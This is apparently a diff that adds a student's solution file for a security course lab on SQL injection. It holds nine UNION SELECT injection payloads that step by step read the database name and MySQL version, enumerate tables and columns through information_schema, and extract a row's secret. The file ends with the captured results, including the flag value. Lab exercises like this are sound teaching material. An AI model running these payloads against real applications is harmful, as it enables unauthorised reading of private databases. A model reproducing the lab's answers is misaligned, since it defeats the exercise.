@@ -1,0 +1,14 @@
+1' and 1=2 UNION SELECT 1,database(),3-- a
+1' and 1=2 UNION SELECT 1,database(),@@VERSION-- a
+1' and 1=2 UNION SELECT 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1-- a
+1' and 1=2 UNION SELECT 1,2,table_name from information_schema.tables where table_schema=database() limit 1,2-- a
+1' and 1=2 UNION SELECT 1,2,table_name from information_schema.tables where table_schema=database() limit 2,3-- a
+1' and 1=2 UNION select 1,2,column_name from information_schema.columns where table_schema=database() and table_name='SECRETTABLE' limit 0,1-- a
+1' and 1=2 UNION select 1,2,column_name from information_schema.columns where table_schema=database() and table_name='SECRETTABLE' limit 1,2-- a
+1' and 1=2 union select 1,2,id from SECRETTABLE limit 0,1-- a
+1' and 1=2 union select 1,2,secret from SECRETTABLE limit 0,1-- a
+
+Name: proj2_xtra_cr3dit
+Version: 5.7.33-0ubuntu0.18.04.1
+Tables: SECRETTABLE,foo,inject3_users
+Secret: hunter2
